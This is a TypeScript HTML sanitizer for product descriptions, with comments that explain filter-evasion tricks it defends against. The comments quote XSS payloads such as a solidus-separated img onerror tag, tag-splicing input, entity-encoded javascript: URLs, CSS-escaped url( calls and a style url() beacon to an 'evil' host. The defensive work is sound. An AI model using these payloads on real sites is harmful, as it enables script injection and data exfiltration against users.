const ALLOWED_TAGS = new Set([
  "p", "div", "span", "h1", "h2", "h3", "h4", "h5", "h6",
  "ul", "ol", "li", "a", "img", "strong", "em", "u", "s",
  "br", "hr", "table", "thead", "tbody", "tr", "th", "td",
  "blockquote", "pre", "code", "style", "figure", "figcaption",
]);

const ALLOWED_ATTRS = new Set([
  "class", "style", "href", "src", "alt", "width", "height",
  "colspan", "rowspan", "target", "rel",
]);

const EVENT_HANDLER_RE = /^on[a-z]/i;

// ---------------------------------------------------------------------------
// Normalisation — used to DECIDE, never to rewrite what is emitted.
//
// A browser resolves HTML character references and CSS escapes before it works
// out what a URL's scheme is or what a declaration does. A filter that compares
// literal tokens against the raw value is reading a different document than the
// parser that ultimately runs, and every disagreement between the two is a way
// through. Both filters below therefore resolve the value first — but only to
// reach a verdict. What survives is the ORIGINAL value: emitting the resolved
// form would change how legitimate content renders and, worse, would hand the
// browser a string it resolves a SECOND time (`\5c 75 rl(` resolves once to
// `\75 rl(`, which a browser would then resolve again to `url(`).
// ---------------------------------------------------------------------------

/** Every named character reference whose expansion contains an ASCII character.
 *
 *  Checked against the WHATWG entities table rather than assumed: of its 2231
 *  named references, 57 expand to something containing an ASCII character, and
 *  between them they produce 34 distinct ASCII characters — all of them below.
 *  Only ONE expands to ASCII letters (`&fjlig;` → "fj"), which is why that entry
 *  looks out of place; an earlier version of this comment claimed no named
 *  reference produces a letter, and that was simply wrong.
 *
 *  Everything the spec can express outside this table is non-ASCII, and no URI
 *  scheme or CSS function name is spelled with non-ASCII characters, so the
 *  numeric forms — which are resolved in full — carry the rest.
 *
 *  Lookup is case-insensitive, which resolves more than a browser would (`&LT;`
 *  is a real reference, `&TAB;` is not); that can only make the verdict
 *  stricter. A trailing ";" is required: the legacy semicolon-less forms are
 *  limited to references such as `&amp` / `&lt` / `&gt` / `&quot`, none of which
 *  produce a character that can extend a scheme or a function name. */
const NAMED_CHARACTER_REFERENCES: Record<string, string> = {
  tab: "\t", newline: "\n", nbsp: "\xa0",
  quot: '"', apos: "'", amp: "&", lt: "<", gt: ">", nvlt: "<", nvgt: ">",
  excl: "!", num: "#", dollar: "$", percnt: "%", ast: "*", midast: "*",
  lpar: "(", rpar: ")", plus: "+", comma: ",", period: ".", sol: "/",
  colon: ":", semi: ";", equals: "=", bne: "=", quest: "?", commat: "@",
  lsqb: "[", lbrack: "[", bsol: "\\", rsqb: "]", rbrack: "]",
  hat: "^", lowbar: "_", underbar: "_", grave: "`", diacriticalgrave: "`",
  lcub: "{", lbrace: "{", verbar: "|", vert: "|", verticalline: "|",
  rcub: "}", rbrace: "}",
  fjlig: "fj",
};

/** A code point outside the Unicode range — or zero — is what a parser turns
 *  into U+FFFD. Returning the replacement character keeps the decoder total:
 *  String.fromCodePoint would otherwise throw on `&#x110000;`, failing the whole
 *  description closed over a malformed reference. The digit runs feeding this
 *  are unbounded on purpose — capping them would leave a truncated tail behind
 *  that a browser still resolves. */
function codePointOrReplacement(value: number): string {
  if (!Number.isFinite(value) || value <= 0 || value > 0x10ffff) return "�";
  return String.fromCodePoint(value);
}

/** Resolve HTML character references the way a tokenizer does inside an
 *  attribute value, including the semicolon-less numeric forms: `&#106avascript:`
 *  really is `javascript:` to a browser.
 *
 *  ONE pass, one regex. A tokenizer resolves each reference exactly once and
 *  never re-reads what it just produced. Resolving the hexadecimal, decimal and
 *  named forms in three ordered passes instead let one pass's OUTPUT become part
 *  of the next pass's input, which does not merely over-decode — it silently
 *  re-segments the references that follow. `&#92` immediately ahead of a `6`
 *  produced by an earlier pass was read as `&#926`, so a run that a browser
 *  resolves to `ur\6C(` was read here as something harmless and let through.
 *  Any future addition must extend this single alternation, never chain
 *  another `.replace()` after it. */
function decodeCharacterReferences(value: string): string {
  return value.replace(
    /&(?:#x([0-9a-f]+);?|#([0-9]+);?|([a-z][a-z0-9]{1,31});)/gi,
    (match, hex: string | undefined, dec: string | undefined, name: string | undefined) => {
      if (hex !== undefined) return codePointOrReplacement(parseInt(hex, 16));
      if (dec !== undefined) return codePointOrReplacement(parseInt(dec, 10));
      return NAMED_CHARACTER_REFERENCES[(name as string).toLowerCase()] ?? match;
    },
  );
}

/** CSS Syntax L3 §3.3: a stylesheet is preprocessed before tokenizing, and CR,
 *  CRLF and FF all become a single LF. That matters here because §4.3.7 lets one
 *  such newline terminate a hexadecimal escape — so `u\72<CR><LF>l(` is `url(`
 *  to a browser, the CRLF counting as the single terminator. Substituting first
 *  keeps the terminator one character wide in `resolveCssEscapes` below.
 *
 *  This is ordinary content, not an exotic input: the generated <style> blocks
 *  on real product descriptions are stored with CRLF line endings. */
function preprocessCssNewlines(css: string): string {
  return css.replace(/\r\n?|\f/g, "\n");
}

/** Resolve CSS escapes (`\72` → `r`) so the filter sees what the browser sees.
 *  The second alternative — a backslash before anything that is not a hex digit
 *  — matters as much as the first: it consumes `\\` as one escaped backslash, so
 *  `\\75 rl(` resolves to `\75 rl(` and NOT to `url(`, which is exactly what a
 *  browser does, resolving each escape once.
 *  Run this on the output of preprocessCssNewlines, never on raw text: the
 *  optional terminator is a single character by that point. */
function resolveCssEscapes(css: string): string {
  return css.replace(
    /\\(?:([0-9a-f]{1,6})[ \t\n]?|([\s\S]))/gi,
    (_m, hex: string | undefined, other: string) =>
      hex !== undefined ? codePointOrReplacement(parseInt(hex, 16)) : other,
  );
}

/** Constructs that make a stylesheet fetch a resource or run legacy script.
 *  `image-set` covers its `-webkit-`/`-moz-` spellings too, since the match is
 *  not anchored.
 *
 *  The "(" must follow the name immediately, with no whitespace, because that is
 *  what makes a function token: `url (x)` is an identifier, a space and a
 *  parenthesised block, and fetches nothing. Allowing whitespace bought no
 *  safety and cost precision — it let the words "url (" inside a comment blank a
 *  35 KB stylesheet. This pass is still neither comment- nor string-aware, so
 *  "url(" written inside a comment does still blank the block.
 *
 *  NO "g" flag: a global regex used with .test() carries its lastIndex from one
 *  call to the next, so the second call on the same input would disagree with
 *  the first — a filter that only holds every other time, and one that passes
 *  unit tests when they run in isolation. */
const CSS_FETCHING_RE = /(?:url|image-set|src|expression)\(|@import/i;

/**
 * Remove dangerous CSS constructs from a style value or a <style> block body.
 *
 * The whole value is dropped as soon as a resource-fetching construct is found,
 * rather than the offending token alone. Surgical removal is what produced
 * `-webkit-image-set( 1x)` — a surviving wrapper — and it cannot be made sound
 * against escapes without a real CSS parser. The trade-off is blunt and
 * deliberate: one `url()` anywhere in a <style> block discards that whole block.
 * No product description in production uses `url(` or `@import` today, so
 * nothing legitimate depends on the finer-grained behaviour.
 *
 * The input is NOT assumed to be well-formed CSS: the <style> delimiter is not
 * quote-aware, so fragments of markup can reach this function.
 */
function stripDangerousCss(css: string): string {
  // The order is the browser's: character references are resolved by the HTML
  // tokenizer (for an inline style attribute), then the CSS preprocessor folds
  // line breaks, then the CSS tokenizer resolves escapes. Any other order reads
  // a different document than the one that will run.
  const resolved = resolveCssEscapes(preprocessCssNewlines(decodeCharacterReferences(css)));
  return CSS_FETCHING_RE.test(resolved) ? "" : css;
}

/** Schemes a product description may link to. Everything else — javascript:,
 *  data:, vbscript:, blob:, file:, and any scheme invented tomorrow — is refused
 *  by construction, which is the point of an allowlist. */
const ALLOWED_SCHEME_RE = /^(?:https?|mailto|tel):/i;

/** Any scheme at all: an ASCII letter, then scheme characters, then ":". */
const ANY_SCHEME_RE = /^[a-z][a-z0-9+.-]*:/i;

/** Two leading slashes in either direction. A browser resolving a relative
 *  reference against an http(s) page treats "//", "\\", "/\" and "\/" alike:
 *  all four inherit the page's scheme and point at another host. */
const SCHEME_RELATIVE_RE = /^[/\\]{2}/;

/** C0 controls, space and DEL. A browser removes tab/CR/LF anywhere in a URL
 *  and trims leading controls before parsing the scheme, so "java&#9;script:"
 *  names a scheme to it while reading as harmless text to a filter that skips
 *  this step. Removing the rest of the range as well only ever makes the verdict
 *  stricter: dropping characters cannot turn a refused value into an allowed
 *  scheme it did not already spell. */
const URI_NOISE_RE = /[\x00-\x20\x7f]/g;

function isSafeUri(rawValue: string): boolean {
  const value = decodeCharacterReferences(rawValue).replace(URI_NOISE_RE, "");
  if (ALLOWED_SCHEME_RE.test(value)) return true;
  if (SCHEME_RELATIVE_RE.test(value)) return false;
  // A reference naming no scheme cannot introduce one: it is a path, a query or
  // a fragment resolved against the current page. Percent-encoding is
  // deliberately NOT decoded here — a browser does not decode it before parsing
  // the scheme either, so "%6aavascript:" is a relative path to both of us.
  return !ANY_SCHEME_RE.test(value);
}

/**
 * Sanitize admin-authored HTML for product descriptions.
 */
const MAX_INPUT_LENGTH = 512_000; // 500KB — reject oversized input

export function sanitizeDescriptionHtml(html: string, productId?: string): string {
  if (!html || !html.trim()) return "";
  if (html.length > MAX_INPUT_LENGTH) {
    console.error("[sanitize-html] Input exceeds max length — returning empty (fail-closed)", { length: html.length, productId });
    return "";
  }

  try {

  let result = html;

  // 0. A "<" immediately followed by another "<" can never open a tag — the
  // tokenizer treats it as literal text — so escape it up front. Leaving it
  // raw let a removal splice a tag back together: in "<<x>img src=y
  // onerror=…>", dropping the disallowed <x> pushed the leading "<" against
  // the text after it and reconstituted a live <img>. Every later pass removes
  // spans that start at a "<", so this is the one adjacency they cannot
  // prevent on their own. Rendering is unchanged — a browser shows "&lt;" and
  // a literal "<" identically — and a lone "<" in prose ("5 < 10") is
  // untouched because it is not followed by another "<".
  result = result.replace(/<(?=<)/g, "&lt;");

  // 1. Remove script/iframe tags and their content entirely.
  // The attribute run stops at "<" as well as ">" ([^<>]) so a "<" that never
  // gets a matching ">" cannot make the engine re-walk the rest of the input
  // once per candidate tag; see the note above step 3 on scan discipline.
  // The "|$" fallback mirrors the <style> pass below and matches how browsers
  // treat an unterminated raw-text element: everything to the end of input is
  // element content, so it all goes. Without it, an unclosed <script> left its
  // body behind as visible text. The closing tag tolerates attributes after
  // the name (`</script foo>`), which the tokenizer also treats as a close.
  result = result.replace(/<(script|iframe)[^<>]*>[\s\S]*?(?:<\/\1(?=[\s/>])[^<>]*>|$)/gi, "");
  result = result.replace(/<(script|iframe)[^<>]*\/?>/gi, "");

  // 2. Process <style> blocks: scope selectors, block @import and url().
  // Tolerate whitespace before the closing tag's ">" — the HTML spec allows it
  // and browsers accept it — as well as a missing closing tag entirely, by
  // falling back to the end of input. Either form previously left the block
  // unmatched, so it fell through to the tag-by-tag pass below untouched.
  // Note: when the "$" branch fires (no closing tag found), the callback below
  // still appends a synthetic "</style>" to its output — the emitted markup
  // always balances even though the input didn't. That synthetic close is
  // itself just text at this point; step 3 below re-scans the whole result
  // and is what actually keeps the rest of the pipeline honest regardless of
  // how this pass reshuffled tag boundaries.
  // The attribute run is [^<>] rather than [^>] for the same scan-discipline
  // reason as step 1 — see the note above step 3.
  result = result.replace(
    /<style[^<>]*>([\s\S]*?)(?:<\/style\s*>|$)/gi,
    (_match, cssContent: string) => {
      let css = stripDangerousCss(cssContent);
      css = css.trim();
      if (!css) return "";
      if (productId) {
        const scopePrefix = `.desc-${productId}`;
        // The "{" is captured as an OPTIONAL group so a run of declaration
        // text that never reaches one is returned untouched instead of making
        // the engine re-walk it from every following position. Requiring the
        // "{" made a brace-free block cost time proportional to the SQUARE of
        // its length; the selector text a run covers now cannot overlap the
        // next run's, so the pass is one sweep. Behaviour is unchanged: a run
        // with no "{" is not a selector and was already left alone.
        css = css.replace(
          /([^{}]+)(\{)?/g,
          (match, selectors: string, brace: string | undefined) => {
            if (brace === undefined) return match;
            const scoped = selectors
              .split(",")
              .map((s: string) => `${scopePrefix} ${s.trim()}`)
              .join(", ");
            return `${scoped} {`;
          },
        );
      }
      return `<style>${css}</style>`;
    },
  );

  // 3. Process all HTML tags: strip disallowed tags, strip dangerous attributes.
  // The attribute section may be separated from the tag name by whitespace OR a
  // solidus ("/") — the HTML tokenizer treats "/" as an attribute separator, so
  // <img/src=x/onerror=alert(1)> is a valid <img> with an onerror handler. The
  // separator class MUST include "/" ([\s/]); matching only \s let such tags
  // pass through verbatim and defeated sanitization entirely (GHSA-92r4).
  //
  // The tag-name class covers every character a browser's tokenizer will fold
  // into a tag name, not just [a-zA-Z0-9]. Per the HTML tag-name tokenizer
  // state, once the first character is an ASCII letter, EVERY subsequent
  // character is appended to the tag name until whitespace, "/", or ">" is
  // seen — that includes "-", "_", ":", "." and non-ASCII characters. A tag
  // name like "my-tag" previously matched neither this regex nor ALLOWED_TAGS,
  // so it never reached the replace callback at all and passed through the
  // sanitizer completely unfiltered, attributes included.
  //
  // Scan discipline — why the runs stop at "<" and why ">" is optional.
  // Both runs below ([^\s/<>] for the name, [^<>] for the attribute section)
  // exclude "<", and the closing ">" is captured as an OPTIONAL group. Two
  // properties follow, and both matter:
  //
  //  * Every run is bounded by the next "<", and the regions those runs cover
  //    for successive candidate tags cannot overlap — a run started at one
  //    "<" always stops at or before the next one. With the trailing ">"
  //    optional the match can never fail once the leading letter is seen, so
  //    the engine never re-walks a run it has already walked. The earlier form
  //    could re-walk the remainder of the input once per "<", which on a large
  //    stored description turned every page view into a long CPU burn inside a
  //    CPU-metered Worker.
  //    Scope of that guarantee: it covers THIS regex's own sweep — finding tag
  //    boundaries — and nothing else. The work the callback below does per tag
  //    (attribute parsing) is bounded separately, at `attrRegex`; each pass in
  //    this file carries its own note, and none of them may be read as a
  //    statement about the function as a whole.
  //
  //  * Excluding "<" from the name does NOT re-admit the class of tag the
  //    widened name class was introduced to catch. When a run stops at a "<"
  //    (or at end of input) there is no ">", so `gt` is undefined and the
  //    whole "<"-plus-name-plus-attributes fragment is DROPPED rather than
  //    matched — the fail-closed branch below. That pairing is the essential
  //    part: bounding the name is only safe when whatever exceeds the bound is
  //    removed. A dropped fragment always ends at the next "<" or at end of
  //    input, so the removal cannot splice a live tag out of the surrounding
  //    text — a tag can only start at a "<", and every "<" is examined here.
  //
  // The old trailing `\s*\/?` before ">" was dead weight: the greedy attribute
  // run already absorbs any trailing whitespace and solidus.
  result = result.replace(
    /<\/?([a-zA-Z][^\s/<>]*)((?:[\s/][^<>]*)?)(>)?/g,
    (match, tagName: string, attrsStr: string, gt: string | undefined) => {
      // No ">" reached before the next "<" or the end of input: not a complete
      // tag, so drop the fragment rather than leave a live tag start (and its
      // handlers) behind in the output.
      if (gt === undefined) return "";

      const tag = tagName.toLowerCase();
      if (tag === "script" || tag === "iframe") return "";

      const isClosing = match.startsWith("</");
      if (!ALLOWED_TAGS.has(tag)) return "";
      if (isClosing) return `</${tag}>`;

      const attrs: string[] = [];
      // The "= value" part is an OPTIONAL group, and a name that turns out to
      // carry no value is skipped below. That keeps exactly the same set of
      // name/value pairs as requiring the "=" did — a name run always ends at
      // the same character whichever position inside it the scan starts from,
      // so if the "=" is missing it is missing for every start inside that run
      // and no pair was ever found there — while removing the re-walk of the
      // run from each of those positions. Requiring the "=" made an attribute
      // section with no "=" cost time proportional to the SQUARE of its
      // length, and this pass runs on every storefront render of a product
      // description inside a CPU-metered Worker.
      const attrRegex = /([a-zA-Z_][\w-]*)(?:\s*=\s*(?:"([^"]*)"|'([^']*)'|(\S+)))?/g;
      let attrMatch: RegExpExecArray | null;
      while ((attrMatch = attrRegex.exec(attrsStr)) !== null) {
        const attrName = attrMatch[1].toLowerCase();
        const rawValue = attrMatch[2] ?? attrMatch[3] ?? attrMatch[4];
        // Valueless attribute ("<div hidden>"): never emitted before either.
        if (rawValue === undefined) continue;
        const attrValue = rawValue;
        if (EVENT_HANDLER_RE.test(attrName)) continue;
        if (!ALLOWED_ATTRS.has(attrName)) continue;
        // Allowlist, not denylist: the value is judged on the scheme a browser
        // will see once it has resolved character references, and anything not
        // explicitly permitted — including a scheme-relative "//host/…" — is
        // dropped. If it passes, the ORIGINAL value is what gets emitted.
        if ((attrName === "href" || attrName === "src") && !isSafeUri(attrValue)) continue;
        let cleanValue = attrValue;
        if (attrName === "style") {
          // Inline style values were not filtered, unlike <style> blocks, so
          // style="background:url(https://evil/…)" exfiltrated visitor requests
          // on load (GHSA-m888). Strip the same dangerous CSS constructs here.
          cleanValue = stripDangerousCss(cleanValue);
        }
        const safeValue = cleanValue.replace(/"/g, "&quot;");
        attrs.push(`${attrName}="${safeValue}"`);
      }

      const attrString = attrs.length > 0 ? ` ${attrs.join(" ")}` : "";
      return `<${tag}${attrString}>`;
    },
  );

  return result;

  } catch (err) {
    console.error("[sanitize-html] Sanitization failed — returning empty (fail-closed)", err, { productId, inputLength: html.length });
    return "";
  }
}
